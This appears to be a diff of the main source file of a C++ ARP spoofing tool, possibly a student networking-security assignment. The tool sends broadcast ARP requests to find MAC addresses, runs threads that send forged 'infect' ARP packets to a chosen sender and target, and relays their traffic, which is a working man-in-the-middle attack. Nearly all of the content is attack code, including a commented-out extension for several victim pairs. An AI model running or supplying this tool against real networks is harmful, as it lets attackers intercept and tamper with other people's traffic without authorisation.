@@ -9,40 +9,33 @@
 #include <iostream>
 #include <csignal>
 
+#include <queue>
+
 #define PACKET_SLEEP_INTERVAL 5
 #define PACKET_INFECT_INTERVAL 60
 
 pcap_t *handle;
 
-// for thread terminate
-// can be list if paralled execute
-int received;
-int received2;
-int rc[1024];
+struct SendArpParam
+{
+    int *t;
+    EthArpPacket packet;
+};
 
 void *threadSendArp(void *param)
 {
-    EthArpPacket *bc_pkt = (EthArpPacket *)param;
-    while (!received)
+    SendArpParam *s = (SendArpParam *)param;
+    int cond = 0;
+    while (!cond)
     {
-        bc_pkt->send(handle);
+        cond = *s->t;
+        s->packet.send(handle);
         sleep(PACKET_SLEEP_INTERVAL);
     }
     printf("arp send end\n");
 };
 
-void *threadSendArp2(void *param)
-{
-    EthArpPacket *bc_pkt = (EthArpPacket *)param;
-    while (!received2)
-    {
-        bc_pkt->send(handle);
-        sleep(PACKET_SLEEP_INTERVAL);
-    }
-    printf("arp send end\n");
-};
-
-// void* arpInfect_th()
+// void* t_infect()
 void *threadInfect(void *param)
 {
     EthArpPacket *inf_pkt = (EthArpPacket *)param;
@@ -56,7 +49,10 @@ void *threadInfect(void *param)
 int main(int argc, char const *argv[])
 {
     if (argc < 4 || argc % 2 == 1)
+    {
         usage();
+        return -1;
+    }
 
     Mac attackerMac;
     Ip attackerIp;
@@ -72,11 +68,8 @@ int main(int argc, char const *argv[])
         return -1;
     }
 
-    // preprocess done
-
-    int schedule = 2;
-    Ip senderIp = Ip(const_cast<char *>(argv[schedule]));
-    Ip targetIp = Ip(const_cast<char *>(argv[schedule + 1]));
+    Ip senderIp = Ip(const_cast<char *>(argv[2]));
+    Ip targetIp = Ip(const_cast<char *>(argv[2 + 1]));
 
     int received[2];
 
@@ -93,9 +86,12 @@ int main(int argc, char const *argv[])
         fprintf(stderr, "couldn't pthread_attr_init error with %d\n", err);
     pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
 
+    // ------declartion done
+
     EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
+    SendArpParam p = {&received[0], bc_pkt};
     printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
-    if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &bc_pkt) != 0)
+    if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &p) != 0)
         printf("thread A create fail : %d\n", err);
 
     Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
@@ -106,11 +102,12 @@ int main(int argc, char const *argv[])
         printf("thread A create fail : %d\n", err);
     printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
 
-    //----
+    //---- sender <-> target exact
 
     EthArpPacket bc_pkt1 = EthArpPacket::broadcastPacket(attackerMac, attackerIp, targetIp);
+    SendArpParam p1 = {&received[1], bc_pkt1};
     printf("broadcast packet sending to target %s...\n", std::string(targetIp).c_str());
-    if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp2, &bc_pkt) != 0)
+    if (int err = pthread_create(&bc_threads[1], &attr, threadSendArp, &p1) != 0)
         printf("thread A create fail : %d\n", err);
 
     Mac targetMac = receiveArpReply(handle, targetIp, &received[1]);
@@ -120,6 +117,8 @@ int main(int argc, char const *argv[])
     if (int err = pthread_create(&inf_threads[1], &attr, threadInfect, &inf_pkt1) != 0)
         printf("thread A create fail : %d\n", err);
     printf("infect thread opened to target %s...\n", std::string(targetIp).c_str());
+
+    //-----
 
     // pcap sniff start
     ProduceParam pparam = {handle, attackerMac};
@@ -140,6 +139,8 @@ int main(int argc, char const *argv[])
         printf("thread e create fail : %d\n", err);
     printf("spoofing %s -> %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
 
+    // sender <-> target exact
+
     SpoofParams sp2 = {handle, attackerMac, targetMac, senderMac};
     if (int err = pthread_create(&spoof_threads[1], &attr, spoof, &sp2) != 0)
         printf("thread f create fail : %d\n", err);
@@ -152,19 +153,68 @@ int main(int argc, char const *argv[])
         printf("main thread...\n");
         sleep(10);
     }
+
+    // std::queue<Ip> args;
+    // for (int i = 2; i < argc; i += 2)
+    // {
+    //     Ip senderIp = Ip(const_cast<char *>(argv[i]));
+    //     Ip targetIp = Ip(const_cast<char *>(argv[i + 1]));
+    //     args.push(senderIp);
+    //     args.push(targetIp);
+    // }
+
+    // int schedule = (argc - 2) / 2;
+    // for (int i = 0; i < schedule; i++)
+    // {
+    //     EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
+    //     SendArpParam p = {&received[i], bc_pkt};
+    //     printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
+    //     if (int err = pthread_create(&bc_threads[i], &attr, threadSendArp, &p) != 0)
+    //         printf("thread A create fail : %d\n", err);
+
+    //     Mac senderMac = receiveArpReply(handle, senderIp, &received[i]);
+    //     printf("sender mac address get : %s\n", std::string(senderMac).c_str());
+
+    //     EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
+    //     if (int err = pthread_create(&inf_threads[i], &attr, threadInfect, &inf_pkt) != 0)
+    //         printf("thread A create fail : %d\n", err);
+    //     printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
+    // }
+
     return 0;
 }
 
-// 리턴값 = pthread_create(스레드 아이디, 스레드 속성, 실행 함수, 스레드 함수 인자)
-// int pthread_create(pthread_t *th_id, const pthread_attr_t *attr, void *함수명, void *arg);
-// pthread_create 함수의 리턴값이 0이면 성공, 아니면 실패다.
-// threadErr = pthread_create(&tA, NULL, threadA, NULL);
-// if (threadErr != 0)
+// void *threadSendArp(void *param)
 // {
-//     printf("thread A create fail : %d\n", threadErr);
-// }
+//     EthArpPacket *bc_pkt = (EthArpPacket *)param;
+//     while (!received)
+//     {
+//         bc_pkt->send(handle);
+//         sleep(PACKET_SLEEP_INTERVAL);
+//     }
+//     printf("arp send end\n");
+// };
 
-// 스레드 종료를 기다림
-// 리턴값 = pthread_join(스레드 아이디, 스레드 리턴 값)
-// int pthread_join(pthread_t th_id, void **thread_return);
-// pthread_join 함수의 리턴값이 0이면 성공, 아니면 실패다.
+// void *threadSendArp2(void *param)
+// {
+//     EthArpPacket *bc_pkt = (EthArpPacket *)param;
+//     while (!received2)
+//     {
+//         bc_pkt->send(handle);
+//         sleep(PACKET_SLEEP_INTERVAL);
+//     }
+//     printf("arp send end\n");
+// };
+
+// EthArpPacket bc_pkt = EthArpPacket::broadcastPacket(attackerMac, attackerIp, senderIp);
+// printf("broadcast packet sending to sender %s...\n", std::string(senderIp).c_str());
+// if (int err = pthread_create(&bc_threads[0], &attr, threadSendArp, &bc_pkt) != 0)
+//     printf("thread A create fail : %d\n", err);
+
+// Mac senderMac = receiveArpReply(handle, senderIp, &received[0]);
+// printf("sender mac address get : %s\n", std::string(senderMac).c_str());
+
+// EthArpPacket inf_pkt = EthArpPacket::infectPacket(attackerMac, senderMac, senderIp, targetIp);
+// if (int err = pthread_create(&inf_threads[0], &attr, threadInfect, &inf_pkt) != 0)
+//     printf("thread A create fail : %d\n", err);
+// printf("infect thread opened to sender %s...\n", std::string(senderIp).c_str());
